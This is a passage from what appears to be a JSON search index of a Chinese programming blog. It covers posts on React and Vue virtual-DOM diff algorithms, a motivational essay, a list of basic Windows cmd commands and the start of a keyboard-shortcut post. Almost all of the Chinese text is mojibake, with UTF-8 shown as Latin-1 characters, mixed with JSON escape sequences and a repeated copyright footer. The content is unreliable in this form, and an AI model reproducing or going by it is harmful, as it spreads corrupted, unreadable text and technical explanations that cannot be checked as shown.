é™¤çš„ä½ç½®)çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n),åŒç†æ·»åŠ æ–°èŠ‚ç‚¹çš„å¤æ‚åº¦ä¹Ÿæ˜¯O(n),åˆèµ·æ¥diffä¸¤ä¸ªæ ‘çš„å¤æ‚åº¦å°±æ˜¯O(nÂ³)\nä¼˜åŒ–çš„Diffç®—æ³• vueå’Œreactçš„è™šæ‹ŸDOMçš„diffç®—æ³•å¤§è‡´ç›¸åŒï¼Œå…¶æ ¸å¿ƒæ˜¯åŸºäºä¸¤ä¸ªç®€å•çš„å‡è®¾:\nä¸¤ä¸ªç›¸åŒçš„ç»„ä»¶äº§ç”Ÿç±»ä¼¼çš„DOMç»“æ„ï¼Œä¸åŒçš„ç»„ä»¶äº§ç”Ÿä¸åŒçš„DOMç»“æ„ åŒä¸€å±‚çº§çš„ä¸€ç»„èŠ‚ç‚¹ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡å”¯ä¸€çš„idè¿›è¡ŒåŒºåˆ† (ä¼˜åŒ–çš„)diffä¸‰ç‚¹ç­–ç•¥: web UIä¸­DOMèŠ‚ç‚¹è·¨å±‚çº§çš„ç§»åŠ¨æ“ä½œç‰¹åˆ«å°‘ï¼Œå¯ä»¥å¿½ç•¥ä¸è®¡ã€‚ æ‹¥æœ‰ç›¸åŒç±»å‹çš„ä¸¤ä¸ªç»„ä»¶å°†ä¼šç”Ÿæˆç›¸ä¼¼çš„æ ‘å½¢ç»“æ„ï¼Œæ‹¥æœ‰ä¸åŒç±»å‹çš„ä¸¤ä¸ªç»„ä»¶å°†ä¼šç”Ÿæˆä¸åŒæ ‘å½¢ç»“æ„ã€‚ å¯¹äºåŒä¸€å±‚çº§çš„ä¸€ç»„è‡ªèŠ‚ç‚¹ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡å”¯ä¸€idè¿›è¡ŒåŒºåˆ†ã€‚ å³, æ¯”è¾ƒåªä¼šåœ¨åŒå±‚çº§è¿›è¡Œ, ä¸ä¼šè·¨å±‚çº§æ¯”è¾ƒ\nReactä¼˜åŒ–Diffç®—æ³• åŸºäºä»¥ä¸Šä¼˜åŒ–çš„diffä¸‰ç‚¹ç­–ç•¥ï¼Œreactåˆ†åˆ«è¿›è¡Œä»¥ä¸‹ç®—æ³•ä¼˜åŒ–\ntree diff component diff element diff tree diff reactå¯¹æ ‘çš„ç®—æ³•è¿›è¡Œäº†åˆ†å±‚æ¯”è¾ƒã€‚react é€šè¿‡ updateDepthå¯¹Virtual Domæ ‘è¿›è¡Œå±‚çº§æ§åˆ¶ï¼Œåªä¼šå¯¹ç›¸åŒé¢œè‰²æ¡†å†…çš„èŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒï¼Œå³åŒä¸€ä¸ªçˆ¶èŠ‚ç‚¹ä¸‹çš„æ‰€æœ‰å­èŠ‚ç‚¹ã€‚å½“å‘ç°èŠ‚ç‚¹ä¸å­˜åœ¨ï¼Œåˆ™è¯¥èŠ‚ç‚¹å’Œå…¶å­èŠ‚ç‚¹éƒ½ä¼šè¢«åˆ é™¤ã€‚è¿™æ ·æ˜¯éœ€è¦éå†ä¸€æ¬¡domæ ‘ï¼Œå°±å®Œæˆäº†æ•´ä¸ªdomæ ‘çš„å¯¹æ¯”\nå¦‚æœæ˜¯è·¨å±‚çº§çš„ç§»åŠ¨æ“ä½œï¼Œå¦‚å›¾\nå½“æ ¹ç»“ç‚¹å‘ç°Aæ¶ˆå¤±äº†ï¼Œä¼šåˆ é™¤æ‰Aä»¥åŠä»–çš„å­èŠ‚ç‚¹ã€‚å½“å‘ç°Dä¸Šå¤šäº†ä¸€ä¸ªAèŠ‚ç‚¹ï¼Œä¼šåˆ›å»ºAï¼ˆåŒ…æ‹¬å…¶å­èŠ‚ç‚¹ï¼‰èŠ‚ç‚¹ä½œä¸ºå­èŠ‚ç‚¹\næ‰€ä»¥ï¼šå½“è¿›è¡Œè·¨å±‚çº§çš„ç§»åŠ¨æ“ä½œï¼Œreactå¹¶ä¸æ˜¯ç®€å•çš„è¿›è¡Œç§»åŠ¨ï¼Œè€Œæ˜¯è¿›è¡Œäº†åˆ é™¤å’Œåˆ›å»ºçš„æ“ä½œï¼Œè¿™ä¼šå½±å“åˆ°reactæ€§èƒ½ã€‚æ‰€ä»¥è¦å°½é‡é¿å…è·¨å±‚çº§çš„æ“ä½œã€‚ï¼ˆä¾‹å¦‚ï¼šæ§åˆ¶displayæ¥è¾¾åˆ°æ˜¾ç¤ºå’Œéšè—ï¼Œè€Œä¸æ˜¯çœŸçš„æ·»åŠ å’Œåˆ é™¤domï¼‰\ncomponent diff å¦‚æœæ˜¯åŒç±»å‹çš„ç»„ä»¶ï¼Œåˆ™ç›´æ¥å¯¹æ¯”virtual Dom tree å¦‚æœä¸æ˜¯åŒç±»å‹çš„ç»„ä»¶ï¼Œä¼šç›´æ¥æ›¿æ¢æ‰ç»„ä»¶ä¸‹çš„æ‰€æœ‰å­ç»„ä»¶ å¦‚æœç±»å‹ç›¸åŒï¼Œä½†æ˜¯å¯èƒ½virtual DOM æ²¡æœ‰å˜åŒ–ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨shouldComponentUpdate()Â æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦è¿›è¡Œdiff å¦‚æœç»„ä»¶Då’Œç»„ä»¶Gï¼Œå¦‚æœç±»å‹ä¸åŒï¼Œä½†æ˜¯ç»“æ„ç±»ä¼¼ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå› ä¸ºç±»å‹ä¸åŒï¼Œæ‰€ä»¥reactä¼šåˆ é™¤Dï¼Œåˆ›å»ºGã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨shouldComponentUpdate()è¿”å›falseä¸è¿›è¡Œdiffã€‚\né’ˆå¯¹react15, 16å‡ºäº†æ–°çš„ç”Ÿå‘½å‘¨æœŸ\ntodo: ???\næ‰€ä»¥ï¼šcomponent diff ä¸»è¦æ˜¯ä½¿ç”¨shouldComponentUpdate() æ¥è¿›è¡Œä¼˜åŒ–\nelement diff element diff æ¶‰åŠä¸‰ç§æ“ä½œï¼šæ’å…¥ï¼Œç§»åŠ¨ï¼Œåˆ é™¤\nä¸ä½¿ç”¨keyçš„è¯ï¼Œreactå¯¹æ–°è€é›†åˆå¯¹æ¯”ï¼Œå‘ç°æ–°é›†åˆä¸­Bä¸ç­‰äºè€é›†åˆä¸­çš„Aï¼Œäºæ˜¯åˆ é™¤äº†Aï¼Œåˆ›å»ºäº†Bï¼Œä¾æ­¤ç±»æ¨ç›´åˆ°åˆ é™¤äº†è€é›†åˆä¸­çš„Dï¼Œåˆ›å»ºäº†Cäºæ–°é›†åˆã€‚=\né…±ç´«ä¼šäº§ç”Ÿæ¸²æŸ“æ€§èƒ½ç“¶é¢ˆï¼Œäºæ˜¯reactå…è®¸æ·»åŠ keyè¿›è¡ŒåŒºåˆ†\nreacté¦–å…ˆå¯¹æ–°é›†åˆè¿›è¡Œéå†ï¼Œfor( name in nextChildren),é€šè¿‡å”¯ä¸€keyæ¥åˆ¤æ–­è€é›†åˆä¸­æ˜¯å¦å­˜åœ¨ç›¸åŒçš„èŠ‚ç‚¹ï¼Œå¦‚æœæ²¡æœ‰çš„è¯åˆ›å»ºï¼Œå¦‚æœæœ‰çš„è¯ï¼Œif (preChild === nextChild ) è¿›è¡Œç§»åŠ¨æ“ä½œ\nç§»åŠ¨ä¼˜åŒ– åœ¨ç§»åŠ¨å‰ï¼Œä¼šå°†èŠ‚ç‚¹åœ¨æ–°é›†åˆä¸­çš„ä½ç½®å’Œåœ¨è€é›†åˆä¸­lastIndexè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœif (child._mountIndex \u0026lt; lastIndex) è¿›è¡Œç§»åŠ¨æ“ä½œï¼Œå¦åˆ™ä¸è¿›è¡Œç§»åŠ¨æ“ä½œã€‚è¿™æ˜¯ä¸€ç§é¡ºåºç§»åŠ¨ä¼˜åŒ–ã€‚åªæœ‰åœ¨æ–°é›†åˆçš„ä½ç½® å°äº åœ¨è€é›†åˆä¸­çš„ä½ç½®Â æ‰è¿›è¡Œç§»åŠ¨ã€‚\nå¦‚æœéå†çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°åœ¨æ–°é›†åˆä¸­æ²¡æœ‰ï¼Œä½†æ˜¯åœ¨è€é›†åˆä¸­çš„èŠ‚ç‚¹ï¼Œä¼šè¿›è¡Œåˆ é™¤æ“ä½œ\næ‰€ä»¥ï¼šelement diff é€šè¿‡å”¯ä¸€key è¿›è¡Œdiff ä¼˜åŒ–ã€‚\næ€»ç»“ï¼š\nreactä¸­å°½é‡å‡å°‘è·¨å±‚çº§çš„æ“ä½œã€‚ å¯ä»¥ä½¿ç”¨shouldComponentUpdate() æ¥é¿å…reacté‡å¤æ¸²æŸ“ã€‚ æ·»åŠ å”¯ä¸€keyï¼Œå‡å°‘ä¸å¿…è¦çš„é‡æ¸²æŸ“ Vueä¼˜åŒ–Diff vue2.x åŠ å…¥äº†virtual domï¼Œå’Œreactæ‹¥æœ‰ç›¸åŒçš„ diff ä¼˜åŒ–åŸåˆ™\nå‚è€ƒ: https://juejin.im/post/5da9789f51882529d1528c3e\nå·®å¼‚å°±åœ¨äº, diffçš„è¿‡ç¨‹å°±æ˜¯è°ƒç”¨patchå‡½æ•°ï¼Œå°±åƒæ‰“è¡¥ä¸ä¸€æ ·ä¿®æ”¹çœŸå®dom\npatchVnode updateChildren updateChildrenæ˜¯vue diffçš„æ ¸å¿ƒ\nè¿‡ç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºï¼šoldChå’ŒnewChå„æœ‰ä¸¤ä¸ªå¤´å°¾çš„å˜é‡StartIdxå’ŒEndIdxï¼Œå®ƒä»¬çš„2ä¸ªå˜é‡ç›¸äº’æ¯”è¾ƒï¼Œä¸€å…±æœ‰4ç§æ¯”è¾ƒæ–¹å¼ã€‚å¦‚æœ4ç§æ¯”è¾ƒéƒ½æ²¡åŒ¹é…ï¼Œå¦‚æœè®¾ç½®äº†keyï¼Œå°±ä¼šç”¨keyè¿›è¡Œæ¯”è¾ƒï¼Œåœ¨æ¯”è¾ƒçš„è¿‡ç¨‹ä¸­ï¼Œå˜é‡ä¼šå¾€ä¸­é—´é ï¼Œä¸€æ—¦StartIdx\u0026gt;EndIdxè¡¨æ˜oldChå’ŒnewChè‡³å°‘æœ‰ä¸€ä¸ªå·²ç»éå†å®Œäº†ï¼Œå°±ä¼šç»“æŸæ¯”è¾ƒ\nVue 2.x vs Vue 3.x Vue2çš„æ ¸å¿ƒDiffç®—æ³•é‡‡ç”¨äº†åŒç«¯æ¯”è¾ƒçš„ç®—æ³•ï¼ŒåŒæ—¶ä»æ–°æ—§childrençš„ä¸¤ç«¯å¼€å§‹è¿›è¡Œæ¯”è¾ƒï¼Œå€ŸåŠ©keyå€¼æ‰¾åˆ°å¯å¤ç”¨çš„èŠ‚ç‚¹ï¼Œå†è¿›è¡Œç›¸å…³æ“ä½œã€‚ç›¸æ¯”Reactçš„Diffç®—æ³•ï¼ŒåŒæ ·æƒ…å†µä¸‹å¯ä»¥å‡å°‘ç§»åŠ¨èŠ‚ç‚¹æ¬¡æ•°ï¼Œå‡å°‘ä¸å¿…è¦çš„æ€§èƒ½æŸè€—ï¼Œæ›´åŠ çš„ä¼˜é›…\nVue3.xå€Ÿé‰´äº† iviç®—æ³•å’Œ infernoç®—æ³•ã€‚åœ¨åˆ›å»ºVNodeæ—¶å°±ç¡®å®šå…¶ç±»å‹ï¼Œä»¥åŠåœ¨mount/patchçš„è¿‡ç¨‹ä¸­é‡‡ç”¨ä½è¿ç®—æ¥åˆ¤æ–­ä¸€ä¸ªVNodeçš„ç±»å‹ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¹‹ä¸Šå†é…åˆæ ¸å¿ƒçš„Diffç®—æ³•ï¼Œä½¿å¾—æ€§èƒ½ä¸Šè¾ƒVue2.xæœ‰äº†æå‡ã€‚(å®é™…çš„å®ç°å¯ä»¥ç»“åˆVue3.xæºç çœ‹\nè¯¥ç®—æ³•ä¸­è¿˜è¿ç”¨äº†åŠ¨æ€è§„åˆ’çš„æ€æƒ³æ±‚è§£æœ€é•¿é€’å½’å­åºåˆ—\nå‚è€ƒ reactå®˜æ–¹æ–‡æ¡£ https://www.jianshu.com/p/398e63dc1969 https://www.jianshu.com/p/21eb0cea85d8 https://segmentfault.com/a/1190000008782928 æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-diff-algorithm/","summary":"\u003cp\u003eä½ äº†è§£ä¼ ç»Ÿçš„diffç®—æ³•ä¹ˆï¼Ÿäº†è§£ react ä¼˜åŒ–çš„diffç®—æ³•ä¹ˆï¼Ÿäº†è§£ Vue2.xå’ŒVue3.x æ¸²æŸ“å™¨çš„diffç®—æ³•\u0026hellip;\u003c/p\u003e","title":"èŠä¸€èŠDiffç®—æ³•ï¼ˆReactã€Vueï¼‰"},{"content":"å°æ—¶å€™, ä½ æƒ³æ¯æ¬¡è€ƒè¯•æ‹¿ç¬¬ä¸€å; åˆ°äº†é«˜ä¸­, ä½ æƒ³è¦è€ƒå›½å†…ä¸€æµçš„å¤§å­¦; æ¯•äº†ä¸š, ä½ æƒ³å»BATåˆ›é€ å±äºä½ çš„ä¸–ç•Œã€‚å¯æ˜¯, ä½ æƒ³è¦çš„é‚£ä¸ªä¸œè¥¿é‚£ä¹ˆç¾å¥½åˆéš¾å¾—, ä½ ä¸ºä¹‹åšäº†ä»€ä¹ˆå‘¢?\nä½ æ€»æ˜¯è¯´, è¿™ä¸ªç­‰ä¸€ç­‰, æ²¡é‚£ä¹ˆé‡è¦, é‚£ä¸ªç¼“ä¸€ç¼“, ä»¥åå†è¯´ã€‚åæ¥æˆ‘æ‰çŸ¥é“, ä½ ä»æ¥éƒ½æ˜¯è¿™æ ·!\næ­£åœ¨çœ‹æ–‡ç« çš„ä½ , ä¹Ÿè®¸ä¼šè§‰å¾—æˆ‘åœ¨ä½ èº«ä¸Šå®‰è£…äº†360åº¦æ— æ­»è§’çš„ç›‘æ§, å·çª¥ç€ä½ çš„æ—¥å¸¸ã€‚å•Šå“ˆå“ˆå“ˆï¼ å…¶å®å¹¶ä¸æ˜¯, æˆ‘åªæ˜¯ä¸€ä¸ªç®—å‘½å…ˆç”Ÿç½¢äº†, åˆšå¥½ç»™ä¸€ä¸ªå«åšé˜¿å‡¯(åŒ–å)çš„å¹´è½»äººç®—äº†ä¸€å¦, ä»–çš„èº«è¾¹åˆšå¥½æœ‰ä¸€ä¸ªè¿™æ ·çš„å«åšèƒ–è¾‰çš„æœ‹å‹, éš¾é“ä½ çš„åå­—ä¹Ÿå«åšèƒ–è¾‰?\né˜¿å‡¯è·Ÿæˆ‘è¯´, ä»–æœ‰ä¸€ä¸ªå¾ˆé“çš„æœ‹å‹èƒ–è¾‰(åŒ–å), é‚£æ¬¡ä»–ä»¬å»å’Œè¦å¥½çš„å¤§å­¦åŒå­¦èšä¼šã€‚ä»–ä»¬çš„ç›®çš„åœ°æ˜¯Dï¼Œ ä»å‡ºå‘ç‚¹Aå‡ºå‘, å…¶å®ç›¸å·®ä¹Ÿä¸æ˜¯å¾ˆè¿œçš„æ ·å­, å¤§æ¦‚å››äº”å…¬é‡Œ, å¤©æ°”ä¸é”™, æ‰€ä»¥, æ¨ç€å°åŒºé—¨å£çš„æ‘©æ‹œä»–ä»¬å°±å‡ºå‘äº†ã€‚\næœ¬æ¥è·¯ä¸Šçš„æ—¶é—´å°±ä¸æ˜¯å¾ˆå……è£•äº†, æ‰€ä»¥é˜¿å‡¯æœ¬æƒ³è·¯ä¸Šéª‘è½¦å¿«ä¸€ç‚¹å„¿ã€‚ç»“æœå‘ç°, èƒ–è¾‰è²Œä¼¼éª‘çš„ç‰¹åˆ«æ…¢, æ™ƒæ™ƒæ‚ æ‚ ä¸€ç‚¹ä¹Ÿä¸ç€æ€¥, é˜¿å‡¯åˆšå¼€å§‹è¿˜å‚¬ä¿ƒèƒ–è¾‰å‡ å¥ã€‚ä½†æ˜¯, çœ‹èµ·æ¥å¹¶æ²¡æœ‰ä»€ä¹ˆæ•ˆæœã€‚\næ‰€ä»¥å‘¢, ç»“æœå°±æ˜¯, ä¸€å…±ä¹Ÿå°±äº”å…­ä¸ªçº¢ç»¿ç»¿ç¯å£çš„ è·¯ç¨‹, å‡ ä¹æ¯æ¬¡è¿‡çº¢ç»¿ç¯å£éƒ½å‡ºç°äº†å°´å°¬çš„ä¸€å¹•, é˜¿å‡¯ç«™åœ¨è¿‡äº†çº¢ç»¿è·¯å£çš„å¦ä¸€ç«¯ç­‰èƒ–è¾‰, è€Œèƒ–è¾‰åœ¨å¯¹é¢æ…¢æ‚ æ‚  çš„éª‘ç€, çœ‹ç€è¿™ä¸€å¹•é˜¿å‡¯å¥½æ°”åˆå¥½ç¬‘ã€‚é˜¿å‡¯è¯´, ä»–æœ¬æƒ³ä¸€ä¸ªäººå¾€å‰â€å¥”è·‘â€, å´å› ä¸ºæ€•èƒ–è¾‰è¿·è·¯, ä¸å¾—ä¸æ¯æ¬¡ åœ¨â€å…³é”®çš„åå­—è·¯å£â€ç­‰èƒ–è¾‰, è€Œèƒ–è¾‰ç¼ºä¾ç„¶åœ¨â€æ…¢æ‚ æ‚ â€ã€‚\nä¹Ÿè®¸æ˜¯æœ‰äº†ä¸€æ¬¡å¿ƒç†çš„æ„Ÿå—ä¹‹å, äººå¯èƒ½ä¼šæ— æ„è¯†çš„å‘ç°ç±»ä¼¼çš„ä¸œè¥¿ã€‚æ…¢æ…¢çš„, é˜¿å‡¯å‘ç°, èƒ–è¾‰æ‰¾å·¥ä½œ, é˜¿å‡¯æ¯”èƒ–è¾‰è¿˜ç€æ€¥, ä½†æ˜¯èƒ–è¾‰ä»–å´ä¸€ç‚¹å„¿éƒ½ä¸ç€æ€¥ã€‚èƒ–è¾‰è¦å¤„ç†ä¸€ä¸‹ä¸´æ—¶åˆç´§æ€¥çš„çš„ä¸œè¥¿, å‘Šè¯‰äº†é˜¿å‡¯, é˜¿å‡¯æ¯”èƒ–è¾‰è¿˜ç€æ€¥çš„å‡ºè°‹åˆ’ç­–, æ¨ä¸å¾—äº²è‡ªä¸Šé˜µ, æœ€åèƒ–è¾‰ä¾æ—§è¿˜æ˜¯æ…¢ååçš„ä¸äº†äº†ä¹‹ã€‚\nç„¶å, å›å¤´èƒ–è¾‰å†è·Ÿé˜¿å‡¯è¯´, â€œæˆ‘ç‰¹åˆ«æƒ³è¦xxx, æˆ‘è§‰å¾—æˆ‘ä¹ŸåŠªåŠ›äº†å•Š, å¯æ˜¯æ€ä¹ˆç»“æœå¹¶ä¸æ˜¯æˆ‘æƒ³è¦çš„â€ã€‚é˜¿å‡¯å´åªèƒ½å°´å°¬åˆæ— å¥ˆçš„ç¬‘äº†ç¬‘, å˜´ä¸Šåº”ä»˜çš„å®‰æ…°äº†å‡ å¥ã€‚\nä»Šå¤©, é˜¿å‡¯é‡åˆ°äº†æˆ‘, ä»–è·Ÿæˆ‘è¯´: â€œå‡ºç°é—®é¢˜, æˆ‘ä¾ç„¶ä¼šç»™èƒ–è¾‰å‡ºè°‹åˆ’ç­–, ä»–æ˜¯æˆ‘å…„å¼Ÿã€‚å¯æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ, æˆ‘å´æ€ä¹ˆéƒ½ç€æ€¥ä¸èµ·æ¥äº†, å› ä¸ºå¥½åƒè¿ä»–è‡ªå·±éƒ½æ²¡é‚£ä¹ˆæƒ³è¦è§£å†³æˆ–è€…å¾—åˆ°å•Šâ€ã€‚\nå¥½äº†, æ•…äº‹è®²å®Œäº†ã€‚ä¹Ÿè®¸æœ‰äººä¼šè¯´, ä½œä¸ºå“¥ä»¬, ä½ å°±ä¸èƒ½ä¸€ç›´åšæŒç€ç£ä¿ƒä»–ä¹ˆ? æˆ‘æƒ³è¯´çš„æ˜¯, æ‹œæ‰˜, ä»–ä¸æ˜¯ä¸€ä¸ªå°æœ‹å‹äº†, æ˜¯ä¸€ä¸ªæˆå¹´äººå•Š, å¦‚æœä»–è‡ªå·±éƒ½æ²¡é‚£ä¹ˆæƒ³, é‚£åˆ«äººæœ‰èƒ½å¦‚ä½•å‘¢?\næ›¾ç»æˆ‘ä¹Ÿæƒ³è¿‡, ä½ ä»æŸä¸ªäººå¹³æ—¶çš„ä¸€äº›å°äº‹, ä½œä¸ºå»è¯„åˆ¤ä¸€ä¸ªäººçš„ä¾æ®, æ˜¯ä¸æ˜¯ä¸å¤ªåˆç†, æˆ–è€…è¯´å¯¹å¯¹æ–¹ä¸å¤ªå…¬å¹³, æ¯•ç«Ÿè¿™æ˜¯é‚£ä¸ªäººåœ¨æ— æ„è¯†çš„æƒ…å†µä¸‹å‘ç”Ÿçš„è¡Œä¸ºã€‚\nä½†æ˜¯, æ…¢æ…¢çš„, æˆ‘å‘ç°, é‚£äº›åœ¨æŸä¸ªé¢†åŸŸæœ‰ä¸€å®šæˆå°±çš„äºº, ä»–ä»¬çš„ç”Ÿæ´»çœŸçš„å°±æ˜¯â€æ—¶åˆ»å‡†å¤‡ç€â€, æ¯•ç«Ÿ, å¥½çš„æœºä¼šå‡ºç°çš„å‡ ç‡, å°±åƒä½ å’Œä½ çš„æ‹äººåœ¨è¿™èŒ«èŒ«äººæµ·ç›¸é‡çš„å‡ ç‡ä¸€æ ·ï¼Œä¸€é—ªè€Œè¿‡, é”™è¿‡äº†, å¯èƒ½å°±çœŸçš„å†ä¹Ÿä¸ä¼šé‡åˆ°äº†ã€‚\næ¯ä¸ªäººéƒ½å¸Œæœ›è‡ªå·±æ›´ä¸Šä¸€å±‚æ¥¼, è¿™æœ¬èº«æ²¡æœ‰ä¸€ä¸ç‚¹å„¿çš„ä¸å¯¹ï¼å¯æ˜¯, å­©å­, ä½œä¸ºä¸€ä¸ª æˆå¹´äºº, ä½ è¦æ¥è¿‡çˆ¶æ¯æ‰‹é‡Œçš„æ¥åŠ›æ£’, æ¥æ›¿ä»–ä»¬å»å®ˆæŠ¤è¿™ä¸ªä½ æˆé•¿äº†åå…«å¹´çš„å®¶åº­, ä½ ä¹Ÿè¦å‡†å¤‡ç€éšæ—¶å»ºç«‹ä¸€ä¸ªå±äºä½ è‡ªå·±çš„å°å®¶, å»åŠªåŠ›è®©è¿™ä¸ªå°å®¶æ›´å¥½çš„ç”Ÿæ´», æ‰¿æ‹…èµ·è¿™ä¸ªå°å®¶çš„è´£ä»»ã€‚\nä½ é•¿å¤§äº†, ä¸å†æ˜¯é‚£ä¸ªè·Ÿåœ¨çˆ¸çˆ¸å¦ˆå¦ˆå±è‚¡åé¢å“­é—¹ç€è¦ç³–æœçš„å°æœ‹å‹ã€‚ä½ æƒ³è¦å»é—¯è¡ç²¾å½©çš„ä¸–ç•Œ, æƒ³è¦å»è·å¾—ç¾å¥½çš„äº‹ç‰©, æ‰€ä»¥ä½ è¦åŠªåŠ›å•Š, è¿™ä¸ªä¸–ç•Œä»æŸç§è§’åº¦æ¥è¯´, æ˜¯ç»å¯¹å…¬å¹³çš„ã€‚ è‹¥ä½ åªæ˜¯åƒä¸ªå­©å­èˆ¬â€å“­å–Šâ€, è€Œä¸æ˜¯æŠŠæ¡ä½æ¯ä¸€æ­¥ï¼Œå……åˆ†çš„å‡†å¤‡, ä½ çš„çˆ¸å¦ˆä¹Ÿå·²ç»è€äº†å•Š, å·²ç»ç»™ä¸äº†ä½ è¦çš„ä¸œè¥¿äº†ã€‚\n8å²é‚£å¹´, ä½ æƒ³æ‹¿é‚£æšé‡‘å…‰é—ªé—ªçš„ç”°å¾„å† å†›çš„å¥–ç‰Œ, ä½ å‘Šè¯‰è‡ªå·±è¦åŠªåŠ›å¾€å‰è·‘å•Šï¼ä»Šå¤©, ä½ 18å²äº†, ä½ æƒ³è¦ä¸€æšåŒæ ·é‡‘å…‰é—ªé—ªâ€æœ‰å‡ºæ¯â€çš„â€å¾½ç« â€, ä½ åº”è¯¥ä¹ŸçŸ¥é“æ€ä¹ˆåšçš„å•Šï¼ å¯¹å‘€, å­©å­, ä½ è¦å¾€å‰è·‘å•Šï¼\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/article-childyouneedtorun/","summary":"å°æ—¶å€™, ä½ æƒ³æ¯æ¬¡è€ƒè¯•æ‹¿ç¬¬ä¸€å; åˆ°äº†é«˜ä¸­, ä½ æƒ³è¦è€ƒå›½å†…ä¸€æµçš„å¤§","title":"å­©å­, ä½ è¦è·‘å•Š"},{"content":"ç»ˆç«¯æ“ä½œ\u0026hellip;\nä¸€ã€cmd å‘½ä»¤ $ service.msc æœåŠ¡ $ taskmgr windows ä»»åŠ¡ç®¡ç†å™¨ $ diskmgmt.msc ç£ç›˜ç®¡ç† $ msconfig ç³»ç»Ÿé…ç½® $ regedit æ³¨å†Œè¡¨ç¼–è¾‘å™¨ äºŒã€æ–‡ä»¶æ“ä½œ 1.common \u0026#34; / \u0026#34; ï¼šæ ¹ç›®å½• \u0026#34; ~ \u0026#34; ï¼šç”¨æˆ·ä¸»ç›®å½•çš„ç¼©å†™ã€‚ä¾‹å¦‚å½“å‰ç”¨æˆ·ä¸ºhelloï¼Œé‚£ä¹ˆ\u0026#34; ~ \u0026#34;å±•å¼€æ¥å°±æ˜¯ï¼š/Users/hello \u0026#34; . \u0026#34; ï¼šå½“å‰ç›®å½• \u0026#34;..\u0026#34; ï¼šçˆ¶ç›®å½• $ cd aaa è¿›å…¥æ–‡ä»¶ $ dir æŸ¥çœ‹æ–‡ä»¶ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½• $ md åˆ›å»ºä¸€ä¸ªå­ç›®å½• $ rd åˆ é™¤ç©ºå­ç›®å½• $ copy æºæ–‡ä»¶å ç›®æ ‡æ–‡ä»¶å $ del åˆ é™¤æŒ‡å®šç£ç›˜ã€ç›®å½•ä¸­çš„ä¸€ä¸ªæˆ–ä¸€ç»„æ–‡ä»¶ $ chkdsk ç£ç›˜å æ£€æŸ¥ç£ç›˜ä½¿ç”¨æƒ…å†µ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/18.%E7%BB%88%E7%AB%AF/","summary":"\u003cp\u003eç»ˆç«¯æ“ä½œ\u0026hellip;\u003c/p\u003e","title":"ç»ˆç«¯(Terminal)"},{"content":"MacOS / Linux / Windowsè®¾å¤‡ç­‰å¿«æ·æ“ä½œ\u0026hellip;\nä¸€ã€åŸºç¡€é”®ä½ \u0026amp; Mac Windows / Linux 1 Command Win 2 Control Ctrl 3 option Alt äºŒã€Macå’ŒWindows å¯¹åº”æŒ‰é”®è¯·è‡ªè¡Œæ›¿æ¢ï¼Œå¦‚Commandè‡ªè¡Œæ›¿æ¢ä¸ºWin\n1.ç³»ç»Ÿ i. MacOS: Command + ç©ºæ ¼ # èšç„¦æœç´¢ Command +ï¼ˆ-ï¼‰ # æ”¾å¤§ï¼ˆç¼©å°ï¼‰è§†å›¾ Control + å·¦å³æ–¹å‘é”® # åˆ‡æ¢ä¸»å±å¹•è§†å›¾ Command + Control + Q # é”å± ii. 